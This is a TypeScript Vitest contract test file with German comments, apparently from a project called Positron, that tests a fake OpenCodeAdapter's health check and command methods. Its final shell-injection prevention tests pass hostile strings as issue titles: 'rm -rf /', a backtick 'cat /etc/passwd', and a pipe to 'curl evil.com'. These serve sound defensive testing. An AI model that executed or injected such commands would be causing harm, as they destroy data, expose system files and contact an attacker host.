// Positron — OpenCodeAdapter Contract Tests (QA-007)
// Testet Fake-Implementierung gegen das Interface.

import { describe, it, expect, beforeAll } from 'vitest';
import type { OpenCodeAdapter } from '@positron/shared';
import { FakeOpenCodeAdapter } from '../fake-adapter.js';

function runOpenCodeAdapterContractTests(
  factory: () => OpenCodeAdapter | Promise<OpenCodeAdapter>,
  label: string,
) {
  describe(`OpenCodeAdapter Contract [${label}]`, () => {
    let adapter: OpenCodeAdapter;

    beforeAll(async () => {
      adapter = await factory();
    });

    // ─── Interface-Präsenz ───

    it('should have all required methods', () => {
      const methods: (keyof OpenCodeAdapter)[] = [
        'healthCheck', 'runSlashCommand', 'runImplement',
      ];
      for (const method of methods) {
        expect(typeof adapter[method]).toBe('function');
      }
    });

    // ─── healthCheck ───

    it('healthCheck: returns health object with required fields', async () => {
      const health = await adapter.healthCheck('/tmp/test-workspace');
      expect(health).toBeDefined();
      expect(health.available).toBeDefined();
      expect(typeof health.available).toBe('boolean');
    });

    it('healthCheck: when unavailable, provides reason', async () => {
      if (label === 'Fake') {
        const fakeAdapter = adapter as FakeOpenCodeAdapter;
        fakeAdapter.setUnavailable();
        const health = await adapter.healthCheck('/tmp/test');
        expect(health.available).toBe(false);
        if (health.reason) {
          expect(typeof health.reason).toBe('string');
        }
        fakeAdapter.setAvailable(); // reset
      }
    });

    // ─── runSlashCommand ───

    it('runSlashCommand: returns command result structure', async () => {
      const result = await adapter.runSlashCommand('test-cmd', {
        runId: 'run-1',
        workspacePath: '/tmp/test',
        issueTitle: 'Test Issue',
      });
      expect(result).toBeDefined();
      expect(result.phase).toBeDefined();
      expect(result.status).toBeDefined();
      expect(result.command).toBeDefined();
    });

    it('runSlashCommand: respects issueTitle and passes it through', async () => {
      const result = await adapter.runSlashCommand('spec-driven-development', {
        runId: 'run-2',
        workspacePath: '/tmp/test',
        issueTitle: 'Fix: critical bug in production',
        issueBody: 'Detailed description',
        issueNumber: 42,
      });
      expect(result).toBeDefined();
    });

    // ─── runImplement ───

    it('runImplement: returns command result', async () => {
      const result = await adapter.runImplement({
        runId: 'run-3',
        workspacePath: '/tmp/test',
        issueTitle: 'Implement feature X',
      });
      expect(result).toBeDefined();
      expect(result.status).toBeDefined();
    });

    // ─── Fehlerfälle ───

    it('runSlashCommand: handles empty workspace path', async () => {
      const result = await adapter.runSlashCommand('cmd', {
        runId: 'run-e1',
        workspacePath: '',
        issueTitle: 'Test',
      });
      expect(result).toBeDefined();
    });

    it('runSlashCommand: handles special characters in issue title', async () => {
      const result = await adapter.runSlashCommand('cmd', {
        runId: 'run-e2',
        workspacePath: '/tmp/test',
        issueTitle: 'Issue with "quotes" and $dollar & <angles>',
      });
      expect(result).toBeDefined();
    });

    it('runSlashCommand: when shouldFailCommands is set, returns failed status', async () => {
      if (label === 'Fake') {
        const fakeAdapter = adapter as FakeOpenCodeAdapter;
        fakeAdapter.setShouldFailCommands(true);
        const result = await adapter.runImplement({
          runId: 'run-fail', workspacePath: '/tmp', issueTitle: 'Fail test',
        });
        expect(result.status).toBe('failed');
        fakeAdapter.setShouldFailCommands(false); // reset
      }
    });

    // ─── Shell-Injection-Prävention ───

    it('runSlashCommand: semicolons in issueTitle do not cause injection', async () => {
      const result = await adapter.runSlashCommand('cmd', {
        runId: 'run-inj1',
        workspacePath: '/tmp/test',
        issueTitle: 'test; rm -rf /',
      });
      expect(result).toBeDefined();
      // Der Befehl sollte nicht tatsächlich rm -rf ausführen
    });

    it('runSlashCommand: backticks in issueTitle do not cause injection', async () => {
      const result = await adapter.runSlashCommand('cmd', {
        runId: 'run-inj2',
        workspacePath: '/tmp/test',
        issueTitle: '`cat /etc/passwd`',
      });
      expect(result).toBeDefined();
    });

    it('runSlashCommand: pipe in issueTitle handled safely', async () => {
      const result = await adapter.runSlashCommand('cmd', {
        runId: 'run-inj3',
        workspacePath: '/tmp/test',
        issueTitle: 'fix | curl evil.com',
      });
      expect(result).toBeDefined();
    });
  });
}

// ─── Ausführung ───

describe('OpenCodeAdapter Contract Suite', () => {
  runOpenCodeAdapterContractTests(() => new FakeOpenCodeAdapter(), 'Fake');
});
